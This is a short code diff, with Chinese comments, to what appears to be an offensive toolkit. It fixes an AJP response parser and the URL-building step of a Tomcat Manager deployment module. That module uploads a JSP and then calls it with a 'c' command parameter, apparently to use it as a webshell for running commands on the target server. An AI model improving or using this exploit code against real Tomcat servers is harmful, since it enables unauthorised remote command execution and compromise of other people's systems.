@@ -4732,10 +4732,14 @@ def ajp_parse_response(data, logger=None):
                 nh = struct.unpack(">H", pay[j:j + 2])[0]
                 j += 2
                 for _ in range(nh):
-                    if pay[j:j + 2] == b"\xa0\x00":
-                        j += 1      # 0xA001~0xA00E 简码：高字节为 0xA0
-                        code = 0xA000 + pay[j]
-                        j += 1
+                    # 声明的头数可能比实际字节多（畸形/被截断），先探够不够 2 字节再 unpack
+                    if len(pay) < j + 2:
+                        out["notes"].append("Send Headers 声明 %d 个头但字节不够，解析到第 %d 个为止"
+                                            % (nh, len(out["headers"])))
+                        break
+                    if pay[j] == 0xA0:          # 0xA001~0xA00E 简码：只看高字节是不是 0xA0
+                        code = 0xA000 + pay[j + 1]
+                        j += 2
                         name = next((k for k, v in _AJP_HEADER_CODES.items()
                                      if v == code), "0x%04x" % code)
                     elif pay[j:j + 2] == b"\xff\xff":
@@ -5093,7 +5097,12 @@ def ex_tomcat_manager_deploy(target, p):
                           "  所以本模块一律按正文的 OK - / FAIL - 判定，不看 status。"}
 
     head.append("部署结果    : %s" % body.splitlines()[0][:160])
-    shell_url = "%s%s/%s?c=%s" % (base, path, jsp_name, urllib.parse.quote(cmd))
+    # path 必须带前导 /（Manager 的 context path 要求），且不能再多补一个 /：
+    # path=/ 时若写成 base + path + "/" + jsp 会拼成 "http://host//cmd.jsp"
+    if not path.startswith("/"):
+        path = "/" + path
+    shell_url = "%s%s%s?c=%s" % (base, path if path.endswith("/") else path + "/",
+                                 jsp_name, urllib.parse.quote(cmd))
     try:
         vr = http(shell_url, timeout=to)
         vb, vsc = vr["body"], vr["status"]
